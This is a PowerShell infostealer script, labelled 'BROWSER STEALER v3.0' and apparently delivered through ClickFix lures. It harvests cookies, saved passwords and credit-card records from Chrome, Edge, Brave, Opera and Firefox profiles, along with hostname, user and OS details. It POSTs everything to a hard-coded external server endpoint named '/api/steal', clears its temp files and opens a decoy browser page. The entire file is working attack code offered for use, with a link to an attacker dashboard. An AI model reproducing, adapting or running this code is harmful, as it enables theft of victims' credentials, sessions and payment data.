# ============================================================
# BROWSER STEALER — Uses Built-in .NET SQLite
# No downloads required — works on Windows 10/11
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"

function Write-Color {
    param($Message, $Color = "White")
    Write-Host $Message -ForegroundColor $Color
}

# ============================================================
# LOAD SQLITE — Using Microsoft.Data.Sqlite (Built-in .NET)
# ============================================================

function Load-SQLite {
    Write-Color "[+] Loading SQLite..." "Cyan"
    
    # Try Microsoft.Data.Sqlite (built into .NET Core / .NET 5+)
    try {
        Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
        Write-Color "[+] Microsoft.Data.Sqlite loaded" "Green"
        return "Microsoft.Data.Sqlite"
    } catch {}
    
    # Try System.Data.SQLite (fallback)
    try {
        [System.Data.SQLite.SQLiteConnection]::new() | Out-Null
        Write-Color "[+] System.Data.SQLite loaded" "Green"
        return "System.Data.SQLite"
    } catch {}
    
    # Check if the DLL exists in the temp folder
    $dllPath = "$env:TEMP\System.Data.SQLite.dll"
    if (Test-Path $dllPath) {
        try {
            [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
            Write-Color "[+] SQLite loaded from temp" "Green"
            return "System.Data.SQLite"
        } catch {}
    }
    
    Write-Color "[!] SQLite not available" "Red"
    return $null
}

$sqliteType = Load-SQLite

# ============================================================
# SQLITE HELPER
# ============================================================

function Read-SQLite {
    param($DbPath, $Query)
    $results = @()
    
    if (-not (Test-Path $DbPath)) { return $results }
    if (-not $sqliteType) { return $results }
    
    try {
        $tempDb = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        Copy-Item $DbPath $tempDb -Force
        
        if ($sqliteType -eq "Microsoft.Data.Sqlite") {
            # Using Microsoft.Data.Sqlite
            $connString = "Data Source=$tempDb"
            $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection($connString)
            $conn.Open()
            
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $row = @{}
                for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                    $name = $reader.GetName($i)
                    $value = $reader.GetValue($i)
                    if ($value -ne $null) {
                        $row[$name] = $value
                    }
                }
                $results += $row
            }
            $reader.Close()
            $conn.Close()
        } else {
            # Using System.Data.SQLite
            $connString = "Data Source=$tempDb;Version=3;"
            $conn = New-Object System.Data.SQLite.SQLiteConnection($connString)
            $conn.Open()
            
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $reader = $cmd.ExecuteReader()
            
            while ($reader.Read()) {
                $row = @{}
                for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                    $name = $reader.GetName($i)
                    $value = $reader.GetValue($i)
                    if ($value -ne $null) {
                        $row[$name] = $value
                    }
                }
                $results += $row
            }
            $reader.Close()
            $conn.Close()
        }
        
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        
    } catch {
        # Silently fail
    }
    return $results
}

# ============================================================
# COOKIE STEALER
# ============================================================

function Get-BrowserCookies {
    param($DbPath, $BrowserName)
    $cookies = @()
    if (-not (Test-Path $DbPath)) { return $cookies }
    if (-not $sqliteType) { return $cookies }
    
    try {
        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT host_key, name, value, path, expires_utc, secure, httponly FROM cookies"
        foreach ($row in $rows) {
            if ($row['name'] -and $row['value'] -and $row['name'] -ne "name") {
                $cookies += @{
                    domain = ($row['host_key'] -or "unknown") -replace '^\.', ''
                    name = $row['name']
                    value = $row['value']
                    path = "/"
                    expires = 0
                    secure = $false
                    httponly = $false
                    browser = $BrowserName
                }
            }
        }
    } catch {}
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    if (-not $sqliteType) { return $cookies }
    
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $cookieFile = "$($profile.FullName)\cookies.sqlite"
            if (Test-Path $cookieFile) {
                try {
                    $rows = Read-SQLite -DbPath $cookieFile -Query "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies"
                    foreach ($row in $rows) {
                        if ($row['name'] -and $row['value']) {
                            $cookies += @{
                                domain = ($row['host'] -or "unknown") -replace '^\.', ''
                                name = $row['name']
                                value = $row['value']
                                path = "/"
                                expires = 0
                                secure = $false
                                httponly = $false
                                browser = "Firefox"
                            }
                        }
                    }
                } catch {}
            }
        }
    }
    return $cookies
}

# ============================================================
# PASSWORD STEALER
# ============================================================

function Get-ChromePasswords {
    param($DbPath, $BrowserName)
    $passwords = @()
    if (-not (Test-Path $DbPath)) { return $passwords }
    if (-not $sqliteType) { return $passwords }
    
    try {
        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT origin_url, username_value, password_value FROM logins"
        foreach ($row in $rows) {
            if ($row['username_value'] -and $row['password_value']) {
                $url = ($row['origin_url'] -or "unknown") -replace 'https?://', ''
                $passwords += @{
                    url = $url
                    username = $row['username_value']
                    password = $row['password_value']
                    browser = $BrowserName
                }
            }
        }
    } catch {}
    return $passwords
}

function Get-OperaPasswords {
    $passwords = @()
    if (-not $sqliteType) { return $passwords }
    
    $path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
    if (Test-Path $path) {
        try {
            $rows = Read-SQLite -DbPath $path -Query "SELECT origin_url, username_value, password_value FROM logins"
            foreach ($row in $rows) {
                if ($row['username_value'] -and $row['password_value']) {
                    $url = ($row['origin_url'] -or "unknown") -replace 'https?://', ''
                    $passwords += @{
                        url = $url
                        username = $row['username_value']
                        password = $row['password_value']
                        browser = "Opera"
                    }
                }
            }
        } catch {}
    }
    return $passwords
}

function Get-FirefoxPasswords {
    $passwords = @()
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $loginsFile = "$($profile.FullName)\logins.json"
            if (Test-Path $loginsFile) {
                try {
                    $content = Get-Content $loginsFile -Raw | ConvertFrom-Json
                    if ($content.logins) {
                        foreach ($login in $content.logins) {
                            $passwords += @{
                                url = ($login.hostname -or "unknown") -replace 'https?://', ''
                                username = $login.username
                                password = $login.password
                                browser = "Firefox"
                            }
                        }
                    }
                } catch {}
            }
        }
    }
    return $passwords
}

# ============================================================
# CREDIT CARD STEALER
# ============================================================

function Get-ChromeCards {
    param($DbPath, $BrowserName)
    $cards = @()
    if (-not (Test-Path $DbPath)) { return $cards }
    if (-not $sqliteType) { return $cards }
    
    try {
        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
        foreach ($row in $rows) {
            if ($row['name_on_card'] -and $row['card_number_encrypted']) {
                $cards += @{
                    name = ($row['name_on_card'] -or "unknown")
                    number = ($row['card_number_encrypted'] -or "unknown")
                    month = ($row['expiration_month'] -or "00")
                    year = ($row['expiration_year'] -or "0000")
                    browser = $BrowserName
                }
            }
        }
    } catch {}
    return $cards
}

# ============================================================
# MAIN EXECUTION
# ============================================================

$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME
$os = (Get-WmiObject Win32_OperatingSystem).Caption

Write-Color ""
Write-Color "============================================" "Cyan"
Write-Color "  🍪 BROWSER STEALER v3.0" "Green"
Write-Color "  Target: $pcName" "Yellow"
Write-Color "  User: $userName" "Yellow"
Write-Color "  OS: $os" "Yellow"
Write-Color "============================================" "Cyan"
Write-Color ""

if (-not $sqliteType) {
    Write-Color "[!] No SQLite available — skipping" "Red"
    Write-Color "[*] Make sure this PC has .NET Core / .NET 5+ installed" "Yellow"
}

# ---- ALL COOKIES ----
$allCookies = @()

# Chrome
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
Write-Color "[+] Chrome cookies..." "Cyan"
$allCookies += Get-BrowserCookies -DbPath $path -BrowserName "Chrome"

# Edge
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
Write-Color "[+] Edge cookies..." "Cyan"
$allCookies += Get-BrowserCookies -DbPath $path -BrowserName "Edge"

# Brave
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
Write-Color "[+] Brave cookies..." "Cyan"
$allCookies += Get-BrowserCookies -DbPath $path -BrowserName "Brave"

# Opera
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
Write-Color "[+] Opera cookies..." "Cyan"
$allCookies += Get-BrowserCookies -DbPath $path -BrowserName "Opera"

# Firefox
Write-Color "[+] Firefox cookies..." "Cyan"
$allCookies += Get-FirefoxCookies

# ---- ALL PASSWORDS ----
$allPasswords = @()

Write-Color "[+] Chrome passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$allPasswords += Get-ChromePasswords -DbPath $path -BrowserName "Chrome"

Write-Color "[+] Edge passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$allPasswords += Get-ChromePasswords -DbPath $path -BrowserName "Edge"

Write-Color "[+] Brave passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$allPasswords += Get-ChromePasswords -DbPath $path -BrowserName "Brave"

Write-Color "[+] Opera passwords..." "Cyan"
$allPasswords += Get-OperaPasswords

Write-Color "[+] Firefox passwords..." "Cyan"
$allPasswords += Get-FirefoxPasswords

# ---- ALL CARDS ----
$allCards = @()

Write-Color "[+] Chrome cards..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
$allCards += Get-ChromeCards -DbPath $path -BrowserName "Chrome"

Write-Color "[+] Edge cards..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
$allCards += Get-ChromeCards -DbPath $path -BrowserName "Edge"

Write-Color "[+] Brave cards..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
$allCards += Get-ChromeCards -DbPath $path -BrowserName "Brave"

# ---- SUMMARY ----
Write-Color ""
Write-Color "=== SUMMARY ===" "Green"
Write-Color "Cookies:    $($allCookies.Count)" "Yellow"
Write-Color "Passwords:  $($allPasswords.Count)" "Yellow"
Write-Color "Cards:      $($allCards.Count)" "Yellow"
Write-Color ""

# ---- BUILD PAYLOAD ----
$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{
        hostname = $pcName
        username = $userName
        os = $os
    }
    fingerprint = @{
        userAgent = "PowerShell Payload (Windows)"
        hostname = $pcName
        browser = "PowerShell"
        screen = "N/A"
    }
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pcName
}

# ---- SEND TO SERVER ----
Write-Color "[+] Sending data to server..." "Cyan"
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $webRequest = [System.Net.WebRequest]::Create($SERVER_URL)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "application/json"
    $webRequest.ContentLength = $bytes.Length
    $stream = $webRequest.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $response = $webRequest.GetResponse()
    $response.Close()
    Write-Color "[+] Data sent successfully!" "Green"
} catch {
    Write-Color "[!] Failed to send: $_" "Red"
}

# ---- CLEANUP ----
Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# ---- DISTRACTION ----
Write-Color "[+] Opening distraction..." "Cyan"
Start-Process "https://www.google.com"

Write-Color "[+] Done!" "Green"
Write-Color ""

# ---- SHOW SAMPLE DATA ----
if ($allPasswords.Count -gt 0) {
    Write-Color "=== SAMPLE PASSWORDS (First 3) ===" "Green"
    $allPasswords | Select-Object -First 3 | ForEach-Object {
        Write-Color "  $($_.url) - $($_.username) / $($_.password)" "Yellow"
    }
}

if ($allCookies.Count -gt 0) {
    Write-Color "=== SAMPLE COOKIES (First 3) ===" "Green"
    $allCookies | Select-Object -First 3 | ForEach-Object {
        $shortVal = $_.value
        if ($shortVal.Length -gt 20) { $shortVal = $shortVal.Substring(0, 20) + "..." }
        Write-Color "  $($_.domain) - $($_.name) = $shortVal" "Yellow"
    }
}

if ($allCards.Count -gt 0) {
    Write-Color "=== SAMPLE CARDS (First 3) ===" "Green"
    $allCards | Select-Object -First 3 | ForEach-Object {
        Write-Color "  $($_.name) - $($_.number) ($($_.month)/$($_.year))" "Yellow"
    }
}

Write-Color ""
Write-Color "[*] Check dashboard: https://cipheranon-production.up.railway.app/dashboard" "Cyan"
Write-Color ""
